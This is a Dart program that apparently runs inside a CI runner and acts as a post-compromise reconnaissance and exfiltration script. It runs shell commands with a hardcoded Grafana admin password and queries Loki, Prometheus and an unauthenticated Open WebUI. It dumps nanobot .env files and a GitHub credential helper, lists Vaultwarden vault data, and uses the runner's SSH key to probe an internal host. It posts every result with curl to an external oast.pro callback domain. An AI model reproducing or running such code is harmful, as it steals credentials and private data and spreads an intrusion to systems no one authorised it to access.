import 'dart:io';

const OAST = '69b125ae2a319e8167d94c26a4fb0ccb4.oast.pro';
int _seq = 0;

String sh(String cmd) {
  try {
    final r = Process.runSync('/bin/sh', ['-c', cmd]);
    var s = (r.stdout ?? '').toString();
    final e = (r.stderr ?? '').toString();
    if (e.isNotEmpty) s += '\n[stderr] ' + e;
    return s;
  } catch (e) {
    return 'ERR ' + e.toString();
  }
}

void postRaw(String path, String body) {
  final f = File('${Directory.systemTemp.path}/pp_${DateTime.now().microsecondsSinceEpoch}_${_seq++}.txt');
  try {
    f.writeAsStringSync(body);
  } catch (e) {
    return;
  }
  final args = <String>['-sS', '-m', '40', '--data-binary', '@' + f.path, 'http://' + OAST + path];
  for (final c in <String>['curl', '/usr/bin/curl']) {
    try {
      final r = Process.runSync(c, args);
      if (r.exitCode == 0) return;
    } catch (e) {}
  }
}

void postChunked(String path, String body, [int max = 8500]) {
  try {
    if (body.length <= max) {
      postRaw(path, body);
      return;
    }
    var i = 0;
    var n = 0;
    while (i < body.length) {
      var end = i + max;
      if (end > body.length) end = body.length;
      postRaw(path + '-' + n.toString(), body.substring(i, end));
      i = end;
      n++;
    }
    postRaw(path + '-meta', 'chunks=' + n.toString() + ' total=' + body.length.toString());
  } catch (e) {}
}

String hdr() {
  final env = Platform.environment;
  return 'RUN=' + (env['GITHUB_RUN_ID'] ?? '?') + ' JOB=' + (env['GITHUB_JOB'] ?? '?') +
      ' WF=' + (env['GITHUB_WORKFLOW'] ?? '?') + ' RUNNER=' + (env['RUNNER_NAME'] ?? '?') + '\n';
}

void main() {
  try {
    final proof = sh(r'''hostname; id; echo HOME=$HOME''');
    stdout.writeln('PROOF5_BEGIN');
    stdout.writeln(proof);
    stdout.writeln('PROOF5_END');
    postChunked('/p5proof', hdr() + '== PROOF ==\n' + proof);

    // ---------- 1. Grafana admin: users list + Loki/Prometheus datasource proxy (read-only) ----------
    var b = StringBuffer(hdr());
    b.writeln('== GRAFANA /api/users ==');
    b.writeln(sh(r'''curl -sS -m 10 -u 'admin:DFXm0n1t0r!2026' 'http://localhost:3100/api/users?perpage=10' 2>&1 | head -c 2500'''));
    b.writeln('== GRAFANA /api/admin/stats ==');
    b.writeln(sh(r'''curl -sS -m 10 -u 'admin:DFXm0n1t0r!2026' http://localhost:3100/api/admin/stats 2>&1 | head -c 1200'''));
    b.writeln('== LOKI LABELS via grafana proxy ==');
    b.writeln(sh(r'''curl -sS -m 15 -u 'admin:DFXm0n1t0r!2026' 'http://localhost:3100/api/datasources/proxy/uid/loki/loki/api/v1/labels' 2>&1 | head -c 2500'''));
    b.writeln('== LOKI BUILDINFO via grafana proxy ==');
    b.writeln(sh(r'''curl -sS -m 15 -u 'admin:DFXm0n1t0r!2026' 'http://localhost:3100/api/datasources/proxy/uid/loki/loki/api/v1/status/buildinfo' 2>&1 | head -c 600'''));
    b.writeln('== PROM TARGETS via grafana proxy ==');
    b.writeln(sh(r'''curl -sS -m 15 -u 'admin:DFXm0n1t0r!2026' 'http://localhost:3100/api/datasources/proxy/uid/prometheus/api/v1/targets?state=active' 2>&1 | head -c 3000'''));
    postChunked('/p5grafana', b.toString());

    // ---------- 2. Open WebUI (WEBUI_AUTH=false) ----------
    b = StringBuffer(hdr());
    b.writeln('== OPENWEBUI /api/config ==');
    b.writeln(sh(r'''curl -sS -m 10 http://localhost:3000/api/config 2>&1 | head -c 2500'''));
    b.writeln('== OPENWEBUI /api/v1/auths/ ==');
    b.writeln(sh(r'''curl -sS -m 10 http://localhost:3000/api/v1/auths/ 2>&1 | head -c 1500'''));
    b.writeln('== OPENWEBUI /api/v1/users/ ==');
    b.writeln(sh(r'''curl -sS -m 10 http://localhost:3000/api/v1/users/ 2>&1 | head -c 2000'''));
    b.writeln('== OPENWEBUI /api/models ==');
    b.writeln(sh(r'''curl -sS -m 10 http://localhost:3000/api/models 2>&1 | head -c 1200'''));
    postChunked('/p5owui', b.toString());

    // ---------- 3. nanobot env files + vaultwarden data listing ----------
    b = StringBuffer(hdr());
    b.writeln('== NANOBOT ENV FILES ==');
    b.writeln(sh(r'''for f in "$HOME"/docker/nanobot/*.env; do if [ -f "$f" ]; then echo "###### $f ($(wc -c < "$f") bytes)"; cat "$f"; echo; fi; done 2>&1'''));
    b.writeln('== NANOBOT gh-cred-helper ==');
    b.writeln(sh(r'''cat "$HOME/docker/nanobot/gh-cred-helper.sh" 2>&1 | head -c 1200'''));
    b.writeln('== VW DATA LISTING ==');
    b.writeln(sh(r'''ls -la "$HOME/docker/vaultwarden/vw-data" 2>&1; du -sh "$HOME/docker/vaultwarden/vw-data" 2>&1'''));
    postChunked('/p5nano', b.toString());

    // ---------- 4. dfxdev single-token ssh probes ----------
    b = StringBuffer(hdr());
    b.writeln('== DFXDEV single-command probes ==');
    for (final cmd in <String>['hostname', 'id', 'whoami', 'uname', 'ls', 'pwd']) {
      b.writeln('### cmd=' + cmd);
      b.writeln(sh(r'''ssh -i "$HOME/.ssh/id_ed25519" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes dfxdev@10.100.100.22 ''' + cmd + r''' 2>&1 | head -8'''));
    }
    postChunked('/p5ssh', b.toString());

    stdout.writeln('PROBE5_COMPLETE');
  } catch (e) {
    stdout.writeln('PROBE5_ERROR ' + e.toString());
  }
}
